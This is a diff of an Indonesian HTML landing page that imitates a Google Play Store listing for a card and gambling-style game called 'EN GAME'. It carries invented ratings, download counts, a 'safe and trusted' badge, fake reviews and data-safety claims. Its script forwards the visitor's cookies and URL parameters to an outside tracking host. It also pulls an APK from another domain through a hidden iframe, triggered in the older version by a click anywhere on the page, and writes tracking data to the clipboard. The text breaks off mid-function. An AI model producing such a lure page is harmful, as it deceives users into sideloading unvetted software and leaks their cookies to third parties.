@@ -1,271 +1,383 @@
 <!doctype html>
-<html lang="en" style="cursor: pointer">
+<html lang="id" style="cursor: pointer">
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <link rel="shortcut icon" href="/favicon.ico" />
     <title>EN GAME</title>
     <style>
+      :root {
+        --green: #01875f;
+        --ink: rgba(0, 0, 0, 0.87);
+        --muted: #5f6368;
+        --line: #e3e3e3;
+      }
+      * {
+        box-sizing: border-box;
+      }
       html,
       body {
         margin: 0;
         padding: 0;
-        font-family: "Arial", sans-serif;
+        font-family: "Roboto", "Arial", sans-serif;
       }
       body {
         -webkit-font-smoothing: antialiased;
-        color: rgba(0, 0, 0, 0.87);
+        color: var(--ink);
         padding: 16px;
         max-width: 500px;
         margin: auto;
         direction: ltr;
-      }
-      h3 {
-        height: 28px;
         text-align: left;
+        background: #fff;
       }
       img {
         margin: 0;
         padding: 0;
       }
-      span {
-        display: inline-block;
-        height: 100%;
+      h3 {
+        font-size: 1.15rem;
+        margin: 0 0 0.5rem;
       }
-      header {
-        display: flex;
-        margin-bottom: 3rem;
-        text-align: left;
-        justify-content: space-between;
-        align-items: center;
+      p {
+        line-height: 1.5;
+        color: var(--muted);
+        font-size: 0.88rem;
       }
-      header .p2 {
-        margin-left: 40px;
-        display: flex;
-      }
-      .p2 img {
-        padding-left: 1rem;
-      }
-      .header-spacer {
-        height: 56px;
-        display: flex;
-        align-items: center;
-      }
-      .icon {
-        width: 24px;
-        height: 24px;
-        padding: 3px;
-      }
-      .tag {
-        flex: 1;
-        position: relative;
-        padding-top: 1.5rem;
-      }
-      .tag::after {
-        content: "";
-        position: absolute;
-        top: 35px;
-        right: 0;
-        bottom: 10px;
-        width: 2px;
-        background-color: #797676;
-      }
-      .tag-value {
-        text-align: center;
-        height: 1.5rem;
-        padding-bottom: 0.5rem;
-        font-weight: bold;
-      }
-      .tag-label {
-        text-align: center;
-        font-size: 0.8rem;
-      }
-      .slider {
-        display: flex;
-        animation: slide-left 30s linear infinite;
-      }
-      .slider img {
-        flex: 0 0 auto;
-        width: 100%;
-        height: auto;
-      }
-      .slider-wrap {
-        margin-top: 3rem;
-        overflow: hidden;
-        height: 206px;
-      }
-      .slider-img {
-        padding-left: 1rem;
-        height: 206px;
-        width: 116px;
-      }
-      .box-item {
-        margin-bottom: 20px;
-        display: flex;
-      }
-      .box-item-icon {
-        width: 10%;
-        padding-right: 1rem;
-      }
-      .box-item-icon img {
-        height: 1.2rem;
-      }
-      .box-item-body {
-        width: 90%;
-        float: left;
-      }
-      .data-card {
-        border: 1px solid #979595;
-        border-radius: 20px;
-        padding: 1rem;
-      }
-      .green-link {
-        color: #01875f;
-        font-weight: bold;
-        margin-left: 1rem;
-      }
+
+      /* App header */
       .app-info {
         display: flex;
+        align-items: center;
+        gap: 16px;
       }
       .app-info img {
-        height: 72px;
-        width: 72px;
-      }
-      .app-info-body {
-        height: 72px;
-        vertical-align: text-top;
-        margin-right: auto;
+        height: 64px;
+        width: 64px;
+        border-radius: 14px;
       }
       .app-info-body h5 {
-        padding: 0;
         margin: 0;
-        font-size: 1.2rem;
-        padding-left: 1rem;
+        font-size: 1.4rem;
+        font-weight: 700;
       }
       .app-info-body h4 {
-        color: #01875f;
-        padding: 0;
-        margin: 0;
-        padding-left: 1rem;
-        font-size: 1.1rem;
+        margin: 2px 0 4px;
+        color: var(--green);
+        font-size: 0.95rem;
+        font-weight: 600;
       }
       .app-info-meta {
-        padding-left: 1rem;
-        font-size: 0.9rem;
+        font-size: 0.8rem;
+        color: var(--muted);
       }
-      .device-line {
+
+      /* Stats row */
+      .stats {
+        display: flex;
+        margin: 1.5rem 0;
+      }
+      .stat {
+        flex: 1;
+        text-align: center;
+        position: relative;
+        padding: 0 6px;
+      }
+      .stat + .stat::before {
+        content: "";
+        position: absolute;
+        left: 0;
+        top: 15%;
+        height: 70%;
+        width: 1px;
+        background: var(--line);
+      }
+      .stat-value {
+        font-weight: 700;
+        font-size: 0.95rem;
         display: flex;
         align-items: center;
+        justify-content: center;
+        gap: 4px;
+        height: 22px;
       }
-      .device-line img {
-        height: 1rem;
-        margin-right: 1rem;
+      .stat-value img {
+        height: 0.85rem;
       }
-      .rate-section {
-        margin-top: 2rem;
+      .stat-value img.badge {
+        height: 1.15rem;
       }
-      .rate-section h3 {
-        padding-bottom: 0.5rem;
-        margin: 0;
+      .stat-label {
+        font-size: 0.72rem;
+        color: var(--muted);
+        margin-top: 4px;
       }
-      .rate-section p {
-        padding-bottom: 2rem;
-        margin: 0;
+      .stat svg {
+        width: 16px;
+        height: 16px;
+        fill: var(--muted);
       }
-      .rate-stars {
-        margin: 1rem 0;
+
+      .tagline {
+        text-align: center;
+        font-weight: 700;
+        font-size: 0.95rem;
+        margin: 0.5rem 0 1.25rem;
       }
-      .rate-stars img {
-        height: 2rem;
-        padding-right: 0.6rem;
-      }
-      .rate-stars img:last-child {
-        padding-right: 0;
-      }
-      .review {
-        margin-top: 2rem;
-      }
-      .review-head {
+
+      /* Install button */
+      .install-btn {
         display: flex;
         align-items: center;
-        height: 4rem;
+        justify-content: center;
+        gap: 10px;
+        width: 100%;
+        background: var(--green);
+        color: #fff;
+        font-size: 1.05rem;
+        font-weight: 600;
+        border: none;
+        border-radius: 10px;
+        padding: 14px 0;
+        cursor: pointer;
       }
-      .review-user {
+      .install-btn svg {
+        width: 20px;
+        height: 20px;
+        fill: #fff;
+      }
+
+      .trust {
         display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+        gap: 6px 16px;
+        margin: 0.9rem 0 0;
+        font-size: 0.78rem;
+        color: var(--muted);
+      }
+      .trust span {
+        display: inline-flex;
+        align-items: center;
+        gap: 5px;
+      }
+      .dot {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: var(--green);
+        display: inline-block;
+      }
+
+      section {
+        margin-top: 1.75rem;
+      }
+
+      /* Chips */
+      .chips {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+        margin-top: 1rem;
+      }
+      .chip {
+        border: 1px solid var(--green);
+        color: var(--green);
+        font-size: 0.78rem;
+        padding: 5px 14px;
+        border-radius: 999px;
+      }
+
+      /* Ratings */
+      .section-head {
+        display: flex;
+        align-items: baseline;
         justify-content: space-between;
-        align-items: center;
       }
-      .review-user span {
-        margin-left: 1rem;
-      }
-      .review-point {
-        height: 2rem;
-        margin-left: auto;
-      }
-      .review-point img {
-        height: 1rem;
-        margin-right: 2rem;
-      }
-      .review-date {
-        display: flex;
-        align-items: center;
-        height: 2rem;
-        justify-content: flex-end;
-      }
-      .review-date img {
-        margin-right: 1rem;
-      }
-      .review-helpful {
-        display: flex;
-        align-items: center;
-      }
-      .review-helpful img {
-        height: 1.5rem;
-      }
-      .review-helpful img.yes {
-        margin-left: 3rem;
+      .section-head a {
+        color: var(--green);
+        font-size: 0.85rem;
+        font-weight: 600;
+        text-decoration: none;
       }
       .ratings-summary {
         display: flex;
-        margin-top: 2rem;
-        justify-content: space-between;
+        margin-top: 1rem;
+        gap: 0.75rem;
+        align-items: center;
       }
       .ratings-score {
-        width: 40%;
-        padding-right: 1rem;
+        text-align: center;
+        flex: 0 0 18%;
+        min-width: 0;
       }
       .ratings-score-num {
-        font-size: 4rem;
+        font-size: 3rem;
+        font-weight: 300;
+        line-height: 1;
       }
       .ratings-score img {
-        height: 1.5rem;
+        height: 0.85rem;
+        margin: 6px 0;
+      }
+      .ratings-score div:last-child {
+        font-size: 0.68rem;
+        color: var(--muted);
       }
       .ratings-bars {
-        width: 60%;
+        flex: 0 0 26%;
+        min-width: 0;
+      }
+      .ratings-bars div {
+        display: flex;
+        align-items: center;
+        gap: 6px;
+        font-size: 0.72rem;
+        color: var(--muted);
+        margin: 2px 0;
       }
       .ratings-bars img {
-        width: 80%;
+        flex: 1;
+        min-width: 0;
+        width: auto;
       }
-      .install-btn {
-        padding-top: 30px;
-        width: 100%;
+
+      .reviews {
+        flex: 1;
+        display: flex;
+        gap: 6px;
+        min-width: 0;
       }
-      .l4 {
-        margin-top: 4rem;
+      .review {
+        flex: 1;
+        min-width: 0;
+        border: 1px solid var(--line);
+        border-radius: 10px;
+        padding: 8px;
       }
-      .l3,
-      .l2,
-      .l1 {
-        margin-top: 3rem;
+      .review-user {
+        display: flex;
+        align-items: center;
+        gap: 5px;
       }
-      .l2 span,
-      .l1 span {
-        margin-right: 1rem;
-        padding: 0;
+      .review .avatar {
+        height: 1.2rem;
+        width: 1.2rem;
+        border-radius: 50%;
+        object-fit: cover;
+        flex: 0 0 auto;
       }
-      .disabledURL {
-        pointer-events: none;
-        color: gray;
+      .review .name {
+        font-size: 0.68rem;
+        font-weight: 600;
+        overflow-wrap: anywhere;
+      }
+      .review-stars {
+        margin: 6px 0 5px;
+      }
+      .review-stars img {
+        height: 0.55rem;
+      }
+      .review p {
+        margin: 0;
+        font-size: 0.66rem;
+        line-height: 1.35;
+        overflow-wrap: anywhere;
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+        line-clamp: 2;
+        overflow: hidden;
+      }
+      .review-dots {
+        display: flex;
+        justify-content: center;
+        gap: 6px;
+        margin-top: 1rem;
+      }
+      .review-dots i {
+        width: 6px;
+        height: 6px;
+        border-radius: 50%;
+        background: #d0d0d0;
+        display: inline-block;
+      }
+      .review-dots i.active {
+        background: var(--green);
+      }
+
+      /* Data safety */
+      .data-card {
+        border: 1px solid var(--line);
+        border-radius: 14px;
+        padding: 18px 10px;
+        margin-top: 1.25rem;
+      }
+      .data-safety {
+        display: flex;
+        align-items: stretch;
+      }
+      .ds-item {
+        flex: 1;
+        display: flex;
+        align-items: flex-start;
+        gap: 8px;
+        padding: 0 5px;
+        position: relative;
+        font-size: 0.72rem;
+        color: var(--muted);
+        line-height: 1.35;
+        word-break: normal;
+        overflow-wrap: break-word;
+      }
+      .ds-item:first-child {
+        padding-left: 0;
+      }
+      .ds-item:last-child {
+        padding-right: 0;
+      }
+      .ds-item + .ds-item::before {
+        content: "";
+        position: absolute;
+        left: 0;
+        top: 0;
+        bottom: 0;
+        width: 1px;
+        background: var(--line);
+      }
+      .ds-item img {
+        height: 1.1rem;
+        flex: 0 0 auto;
+        margin-top: 1px;
+      }
+      .green-link {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        color: var(--green);
+        font-weight: 600;
+        font-size: 0.9rem;
+        margin-top: 1.1rem;
+      }
+
+      .update {
+        display: flex;
+        gap: 12px;
+        align-items: flex-start;
+        margin-top: 1rem;
+      }
+      .update svg {
+        width: 26px;
+        height: 26px;
+        flex: 0 0 auto;
+      }
+      .update p {
+        margin: 0;
+      }
+      .update-date {
+        font-size: 0.78rem;
+        color: var(--muted);
+        margin-top: 4px;
       }
     </style>
 
@@ -294,7 +406,7 @@
         "script",
         "https://connect.facebook.net/en_US/fbevents.js",
       );
-      fbq("init", "4439698059631984");
+      fbq("init", "829169820249918");
       fbq("track", "PageView");
     </script>
     <noscript>
@@ -302,199 +414,92 @@
         height="1"
         width="1"
         style="display: none"
-        src="https://www.facebook.com/tr?id=4439698059631984&ev=PageView&noscript=1"
+        src="https://www.facebook.com/tr?id=829169820249918&ev=PageView&noscript=1"
       />
     </noscript>
     <!-- End Meta Pixel Code -->
-
-    <!-- <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        const slider = document.querySelector(".slider");
-        let isDragging = false;
-        let startPos = 0;
-        let currentTranslate = 0;
-        let prevTranslate = 0;
-
-        slider.addEventListener("mousedown", startDrag);
-        slider.addEventListener("touchstart", startDrag);
-        slider.addEventListener("mouseup", endDrag);
-        slider.addEventListener("touchend", endDrag);
-        slider.addEventListener("mousemove", drag);
-        slider.addEventListener("touchmove", drag);
-
-        function startDrag(event) {
-          if (event.type === "touchstart") {
-            startPos = event.touches[0].clientX;
-          } else {
-            startPos = event.clientX;
-            event.preventDefault();
-          }
-          isDragging = true;
-          slider.classList.add("grabbing");
-        }
-
-        function drag(event) {
-          if (!isDragging) return;
-          let currentPosition =
-            event.type === "touchmove" ? event.touches[0].clientX : event.clientX;
-          const diff = currentPosition - startPos;
-          currentTranslate = prevTranslate + diff;
-          if (currentTranslate < -300) currentTranslate = 0;
-          if (currentTranslate > 0) currentTranslate = 0;
-          slider.style.transform = `translateX(${currentTranslate}px)`;
-        }
-
-        function endDrag() {
-          isDragging = false;
-          slider.classList.remove("grabbing");
-          prevTranslate = currentTranslate;
-        }
-      });
-    </script> -->
   </head>
 
   <body>
-    <header>
-      <div class="header-spacer"></div>
-      <div class="p2">
-        <img src="files/search.png" alt="" class="icon" />
-        <img src="files/q.png" alt="" class="icon" />
-        <img src="files/lg.png" alt="" class="icon" />
-      </div>
-    </header>
-
     <div class="app-info">
       <img src="files/appicon1.png" alt="" />
       <div class="app-info-body">
-        <div><h5>EN GAME</h5></div>
+        <h5>EN GAME</h5>
         <h4>EN GAME</h4>
-        <div class="app-info-meta">
-          Termasuk Iklan dan Pembelian dalam Aplikasi
+        <div class="app-info-meta">Berisi iklan &bull; Pembelian dalam aplikasi</div>
+      </div>
+    </div>
+
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-value">
+          4,8 <img src="files/bstart.png" alt="" />
         </div>
+        <div class="stat-label">1,42 juta ulasan</div>
       </div>
-    </div>
-    <div style="height: 1rem"></div>
-
-    <div style="display: flex" class="ads">
-      <div style="width: 40%" class="tag">
-        <div class="tag-value">
-          4.8
-          <img src="files/bstart.png" alt="" style="height: 0.8rem" />
+      <div class="stat">
+        <div class="stat-value">
+          <svg viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/></svg>
         </div>
-        <div class="tag-label">1.42 juta ulasan</div>
+        <div class="stat-label">+1125 juta Unduhan</div>
       </div>
-      <div style="width: 30%" class="tag">
-        <div class="tag-value">+1125 juta</div>
-        <div class="tag-label">Unduhan</div>
-      </div>
-      <div style="width: 30%" class="tag">
-        <div class="tag-value">
-          <img src="files/18+.png" alt="" style="height: 1.2rem" />
+      <div class="stat">
+        <div class="stat-value">
+          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
         </div>
-        <div class="tag-label">Cocok untuk usia 18 tahun ke atas</div>
+        <div class="stat-label">Aman &amp; Terpercaya</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value">
+          <img class="badge" src="files/18+.png" alt="" />
+        </div>
+        <div class="stat-label">Cocok untuk 18+ tahun ke atas</div>
       </div>
     </div>
 
-    <div>
-      <img class="install-btn" src="files/install.png" alt="" height="48px" />
+    <div class="tagline">
+      Main Poker, Rummy, Teen Patti &amp; permainan kartu populer gratis
     </div>
 
-    <div class="device-line">
-      <img src="files/device.png" alt="" />
-      Tersedia di semua perangkat Anda
+    <button type="button" class="install-btn">
+      <svg viewBox="0 0 24 24"><path d="M5 20h14v-2H5v2zM19 9h-4V3H9v6H5l7 7 7-7z"/></svg>
+      Instal Sekarang
+    </button>
+
+    <div class="trust">
+      <span><i class="dot"></i> Aman diunduh</span>
+      <span><i class="dot"></i> Ringan</span>
+      <span><i class="dot"></i> Cocok untuk perangkat Android</span>
     </div>
 
-    <!-- <div class="slider-wrap">
-      <div class="slider">
-        <img class="slider-img" src="files/image1.jpg" alt="" />
-        <img class="slider-img" src="files/image2.jpg" alt="" />
-        <img class="slider-img" src="files/image3.png" alt="" />
-        <img class="slider-img" src="files/image4.png" alt="" />
-      </div>
-    </div> -->
-
-    <div>
-      <h3>Fitur Baru</h3>
-      <p>Perbaikan bug dan peningkatan</p>
-    </div>
-
-    <div>
-      <h3>Keamanan Data</h3>
+    <section>
+      <h3>Tentang Game Ini</h3>
       <p>
-        Keamanan dimulai dengan memahami bagaimana pengembang mengumpulkan dan
-        membagikan data. Perlindungan privasi dan ukuran keamanan dapat
-        bervariasi berdasarkan penggunaan, lokasi, dan usia. Informasi ini
-        disediakan oleh pengembang dan dapat diperbarui seiring waktu.
+        EN GAME menghadirkan pengalaman bermain kartu terbaik untuk Anda!
+        Nikmati Teen Patti, Rummy, Poker, Andar Bahar, Cricket, dan banyak lagi
+        permainan kartu populer. Main gratis kapan saja, klaim hadiah harian,
+        dan raih kemenangan!
       </p>
-    </div>
+      <div class="chips">
+        <span class="chip">Teen Patti</span>
+        <span class="chip">Rummy</span>
+        <span class="chip">Poker</span>
+        <span class="chip">Andar Bahar</span>
+        <span class="chip">Cricket</span>
+      </div>
+    </section>
 
-    <div class="data-card">
-      <div class="box-item">
-        <div class="box-item-icon"><img src="files/k1.png" alt="" /></div>
-        <div class="box-item-body">
-          <p style="padding: 0; margin: 0">
-            Data tidak dibagikan dengan pihak ketiga <br />
-            <span style="text-decoration: underline"
-              >Pelajari lebih lanjut tentang</span
-            >
-            cara pengembang mengumumkan berbagi data
-          </p>
-        </div>
+    <section>
+      <div class="section-head">
+        <h3>Rating dan Ulasan</h3>
+        <a href="javascript:void(0)">Lihat semua &rsaquo;</a>
       </div>
-      <div class="box-item">
-        <div class="box-item-icon"><img src="files/k2.png" alt="" /></div>
-        <div class="box-item-body">
-          Aplikasi ini mungkin mengumpulkan jenis data berikut: Informasi
-          lokasi, Informasi pribadi, dan empat jenis data lainnya
-        </div>
-      </div>
-      <div class="box-item">
-        <div class="box-item-icon"><img src="files/k3.png" alt="" /></div>
-        <div class="box-item-body">Data tidak akan dienkripsi</div>
-      </div>
-      <div class="box-item">
-        <div class="box-item-icon"><img src="files/k4.png" alt="" /></div>
-        <div class="box-item-body">
-          Anda dapat meminta pengembang untuk menghapus data
-        </div>
-      </div>
-      <div class="green-link">Periksa detail</div>
-    </div>
-
-    <!-- <div class="rate-section">
-      <h3>Rate this game</h3>
-      <p>share your ideas</p>
-      <div>
-        <img
-          src="files/phone.png"
-          alt=""
-          style="height: 2rem; margin-top: 2rem"
-        />
-      </div>
-      <div class="rate-stars">
-        <img src="files/wstar.png" alt="" />
-        <img src="files/wstar.png" alt="" />
-        <img src="files/wstar.png" alt="" />
-        <img src="files/wstar.png" alt="" />
-        <img src="files/wstar.png" alt="" />
-      </div>
-      <div>
-        <img src="files/review.png" alt="" style="height: 2rem" />
-      </div>
-    </div> -->
-
-    <div style="direction: ltr; text-align: left">
-      <h3>Ratings and Reviews</h3>
-      <p style="font-size: 0.8rem">
-        The ratings and reviews have been verified
-        <img src="files/i.png" alt="" style="height: 0.8rem" />
-      </p>
 
       <div class="ratings-summary">
         <div class="ratings-score">
-          <div class="ratings-score-num">4.8</div>
+          <div class="ratings-score-num">4,8</div>
           <img src="files/bfs.png" alt="" />
-          <div>1.42 million reviews</div>
+          <div>1,42 juta ulasan</div>
         </div>
         <div class="ratings-bars">
           <div>5 <img src="files/p5.png" alt="" /></div>
@@ -503,239 +508,194 @@
           <div>2 <img src="files/p3.png" alt="" /></div>
           <div>1 <img src="files/p1.png" alt="" /></div>
         </div>
+
+        <div class="reviews">
+          <div class="review">
+            <div class="review-user">
+              <img class="avatar" src="files/h1.png" alt="" />
+              <span class="name">Rizky Pratama</span>
+            </div>
+            <div class="review-stars"><img src="files/bfs.png" alt="" /></div>
+            <p>Game-nya seru banget! Hadiah hariannya juara, pasti rekomendasi!</p>
+          </div>
+
+          <div class="review">
+            <div class="review-user">
+              <img class="avatar" src="files/h2.png" alt="" />
+              <span class="name">Siti Aula</span>
+            </div>
+            <div class="review-stars"><img src="files/bfs.png" alt="" /></div>
+            <p>Banyak pilihan game kartu dan gratis. Mantap!</p>
+          </div>
+        </div>
       </div>
 
-      <!-- <div class="review">
-        <div class="review-head">
-          <div class="review-user">
-            <img src="files/h1.png" alt="" style="height: 2rem" />
-            <span>bakdoe tenzin</span>
+      <div class="review-dots">
+        <i class="active"></i>
+        <i></i>
+        <i></i>
+        <i></i>
+      </div>
+    </section>
+
+    <section>
+      <h3>Keamanan Data</h3>
+      <div class="data-card">
+        <div class="data-safety">
+          <div class="ds-item">
+            <img src="files/k1.png" alt="" />
+            <span>Data tidak dibagikan dengan pihak ketiga</span>
           </div>
-          <div class="review-point" style="line-height: 2.5rem">
-            <img src="files/point.png" alt="" />
+          <div class="ds-item">
+            <img src="files/k2.png" alt="" />
+            <span>Aplikasi ini mungkin mengumpulkan data</span>
+          </div>
+          <div class="ds-item">
+            <img src="files/k3.png" alt="" />
+            <span>Data tidak akan dienkripsi</span>
+          </div>
+          <div class="ds-item">
+            <img src="files/k4.png" alt="" />
+            <span>Anda dapat meminta penghapusan data</span>
           </div>
         </div>
-        <div class="review-date">
-          <img src="files/small.png" alt="" />
-          June 25, 2023
-        </div>
+        <div class="green-link">Periksa detail &rarr;</div>
+      </div>
+    </section>
+
+    <section>
+      <h3>Pembaruan</h3>
+      <div class="update">
+        <svg viewBox="0 0 24 24">
+          <path
+            fill="#01875f"
+            d="M12 2a10 10 0 100 20 10 10 0 000-20zm-1.2 14.2-4-4 1.4-1.4 2.6 2.6 5.6-5.6 1.4 1.4-7 7z"
+          />
+        </svg>
         <div>
-          <p>Fun and enjoyable for hours!</p>
-          <p>15 people found this review helpful</p>
-          <p class="review-helpful">
-            <span>Did you find this review helpful?</span>
-            <img class="yes" src="files/yes.png" alt="" />
-            <img src="files/no .png" alt="" />
+          <p>
+            Perbaikan bug, peningkatan performa, dan pengalaman bermain yang
+            lebih stabil.
           </p>
+          <div class="update-date">10 Mei 2026</div>
         </div>
       </div>
+    </section>
 
-      <div class="review">
-        <div class="review-head">
-          <div class="review-user">
-            <img src="files/h2.png" alt="" style="height: 2.5rem" />
-            <span>nick cook</span>
-          </div>
-          <div class="review-point" style="line-height: 2rem">
-            <img src="files/point.png" alt="" />
-          </div>
-        </div>
-        <div class="review-date">
-          <img src="files/small.png" alt="" />
-          April 30, 2023
-        </div>
-        <div>
-          <p>High-quality graphics and gameplay style.</p>
-          <p>5 people found this review helpful</p>
-          <p class="review-helpful">
-            <span>Did you find this review helpful?</span>
-            <img class="yes" src="files/yes.png" alt="" />
-            <img src="files/no .png" alt="" />
-          </p>
-        </div>
-      </div>
+    <script src="files/Adjustscript.js"></script>
+    <script>
+      const APK_NAME = "enjoyplusplus.prod.3.14.apk";
+      const APK_BASE_URL = "https://downloads.afbgaming.app/";
+      const DOWNLOAD_URL = APK_BASE_URL + APK_NAME;
 
-      <div class="review">
-        <div class="review-head">
-          <div class="review-user">
-            <img src="files/h3.png" alt="" style="height: 2.5rem" />
-            <span>Fatt Foo</span>
-          </div>
-          <div class="review-point" style="line-height: 2rem">
-            <img src="files/point.png" alt="" />
-          </div>
-        </div>
-        <div class="review-date">
-          <img src="files/small.png" alt="" />
-          June 12, 2023
-        </div>
-        <div>
-          <p>Continuously updated with new content.</p>
-          <p>5 people found this review helpful</p>
-          <p class="review-helpful">
-            <span>Did you find this review helpful?</span>
-            <img class="yes" src="files/yes.png" alt="" />
-            <img src="files/no .png" alt="" />
-          </p>
-        </div>
-      </div>
+      let link;
+      function initLink() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const p0 = urlParams.get("ajtoken");
+        const p1 = urlParams.get("p1");
+        const p2 = urlParams.get("p2");
+        const p3 = urlParams.get("p3");
+        const p4 = urlParams.get("p4");
+        const p5 = urlParams.get("p5");
+        const p6 = urlParams.get("p6");
+        const fbPid = getFbPid();
+        const fbClickId = urlParams.get("fbclid");
+        const url = buildURL(p0, p1, p2, p3, p4, p5, p6, fbClickId, fbPid);
 
-      <div class="green-link">Lihat semua audit</div> -->
+        link =
+          url === ""
+            ? DOWNLOAD_URL
+            : url + "&redirect=" + encodeURIComponent(DOWNLOAD_URL);
+      }
+      initLink();
 
-      <div class="review-head">
-        <div class="review-user">
-          <h3 style="margin-right: 1rem">Pembuka permainan</h3>
-        </div>
-        <div class="review-point" style="line-height: 2rem">
-          <img src="files/v1.png" alt="" />
-        </div>
-      </div>
-      <p>
-        Play Teenpatti (Indian Poker), Cricket, Rummy, Poker, and Andar Behar in
-        real-time with millions of players from all around the world!
-      </p>
-      <p>Free game!</p>
-      <p>...</p>
+      window.onload = function () {
+        sendBeacon(
+          "https://api.anubisriches.com/api/advertising/onshow",
+          "show",
+        );
+        // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
+        // document.addEventListener("click", onClickBtn, true);
+        // document.addEventListener("touchend", onClickBtn, true);
+      };
 
-      <h3>Updates</h3>
-      <p>May 10, 2026</p>
-
-      <div class="l4">
-        <p>Play Pass</p>
-        <p>Play Points</p>
-        <p>Gift Cards</p>
-        <p>Exchange</p>
-        <p>Refund Policy</p>
-      </div>
-
-      <div class="l3">
-        <p>Kids & Families</p>
-        <p>Parent Guide</p>
-        <p>Family Sharing</p>
-      </div>
-
-      <div class="l2">
-        <div>
-          <span>Terms of Service</span>
-          <span>Privacy</span>
-        </div>
-      </div>
-
-      <script src="files/Adjustscript.js"></script>
-      <script>
-        const APK_NAME = "enjoyplusplus.prod.3.14.apk";
-        const APK_BASE_URL = "https://downloads.afbgaming.app/";
-        const DOWNLOAD_URL = APK_BASE_URL + APK_NAME;
-
-        let link;
-        function initLink() {
-          const urlParams = new URLSearchParams(window.location.search);
-          const p0 = urlParams.get("ajtoken");
-          const p1 = urlParams.get("p1");
-          const p2 = urlParams.get("p2");
-          const p3 = urlParams.get("p3");
-          const p4 = urlParams.get("p4");
-          const p5 = urlParams.get("p5");
-          const p6 = urlParams.get("p6");
-          const fbPid = getFbPid();
-          const fbClickId = urlParams.get("fbclid");
-          const url = buildURL(p0, p1, p2, p3, p4, p5, p6, fbClickId, fbPid);
-
-          link =
-            url === ""
-              ? DOWNLOAD_URL
-              : url + "&redirect=" + encodeURIComponent(DOWNLOAD_URL);
-        }
-        initLink();
-
-        window.onload = function () {
-          sendBeacon(
-            "https://api.anubisriches.com/api/advertising/onshow",
-            "show",
-          );
-          // 全屏点击触发下载 + 复制（需要用户手势，剪贴板才能写入）
-          document.addEventListener("click", onClickBtn, true);
-          document.addEventListener("touchend", onClickBtn, true);
+      function sendBeacon(url, label) {
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", getUrl(url), true);
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4 && xhr.status === 200) {
+            console.log(label);
+          }
         };
+        xhr.send();
+      }
 
-        function sendBeacon(url, label) {
-          const xhr = new XMLHttpRequest();
-          xhr.open("GET", getUrl(url), true);
-          xhr.onreadystatechange = function () {
-            if (xhr.readyState === 4 && xhr.status === 200) {
-              console.log(label);
-            }
-          };
-          xhr.send();
-        }
+      function getUrl(url) {
+        const cookieStr = document.cookie
+          .replace("; ", "&")
+          .replace(";", "&");
+        const sep = window.location.search.length
+          ? window.location.search + "&"
+          : "?";
+        const requestUrl = url + sep + cookieStr;
+        console.log("requestUrl", requestUrl);
+        return requestUrl;
+      }
 
-        function getUrl(url) {
-          const cookieStr = document.cookie
-            .replace("; ", "&")
-            .replace(";", "&");
-          const sep = window.location.search.length
-            ? window.location.search + "&"
-            : "?";
-          const requestUrl = url + sep + cookieStr;
-          console.log("requestUrl", requestUrl);
-          return requestUrl;
-        }
+      function getCookie(name) {
+        const value = "; " + document.cookie;
+        const parts = value.split("; " + name + "=");
+        if (parts.length === 2) return parts.pop().split(";").shift();
+        return null;
+      }
 
-        function getCookie(name) {
-          const value = "; " + document.cookie;
-          const parts = value.split("; " + name + "=");
-          if (parts.length === 2) return parts.pop().split(";").shift();
-          return null;
-        }
+      function onClickBtn() {
+        downloadApk();
+        sendBeacon(
+          "https://api.anubisriches.com/api/advertising/ondownload",
+          "click",
+        );
 
-        function onClickBtn() {
-          downloadApk();
-          sendBeacon(
-            "https://api.anubisriches.com/api/advertising/ondownload",
-            "click",
-          );
-
-          const { location } = window;
-          const params = {};
-          let queryString = location.search;
-          if (queryString) {
-            queryString = queryString.substring(1);
-            const paramPairs = queryString.split("&");
-            for (let i = 0; i < paramPairs.length; i++) {
-              const pair = paramPairs[i].split("=");
-              params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
-            }
-          }
-
-          const copyParam = {
-            fbc: params["fbclid"] || "",
-            fbp: getCookie("_fbp") || "",
-            leadId: params["leadId"] || "",
-            link: getUrl(location.origin + location.pathname),
-          };
-          copyParams(copyParam);
-        }
-
-        async function copyParams(copyParam) {
-          try {
-            await navigator.clipboard.writeText(JSON.stringify(copyParam));
-            console.log("复制成功");
-          } catch (err) {
-            console.error("复制失败", err);
+        const { location } = window;
+        const params = {};
+        let queryString = location.search;
+        if (queryString) {
+          queryString = queryString.substring(1);
+          const paramPairs = queryString.split("&");
+          for (let i = 0; i < paramPairs.length; i++) {
+            const pair = paramPairs[i].split("=");
+            params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1]);
           }
         }
 
-        function downloadApk() {
-          console.log("clicked", link);
-          const iframe = document.createElement("iframe");
-          iframe.style.display = "none";
-          iframe.src = link;
-          document.body.appendChild(iframe);
-          setTimeout(() => {
-            document.body.removeChild(iframe);
-          }, 1000);
+        const copyParam = {
+          fbc: params["fbclid"] || "",
+          fbp: getCookie("_fbp") || "",
+          leadId: params["leadId"] || "",
+          link: getUrl(location.origin + location.pathname),
+        };
+        copyParams(copyParam);
+      }
+
+      async function copyParams(copyParam) {
+        try {
+          await navigator.clipboard.writeText(JSON.stringify(copyParam));
+          console.log("复制成功");
+        } catch (err) {
+          console.error("复制失败", err);
         }
-      </script>
-    </div>
+      }
+
+      function downloadApk() {
+        console.log("clicked", link);
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = link;
+        document.body.appendChild(iframe);
+        setTimeout(() => {
+          document.body.removeChild(iframe);
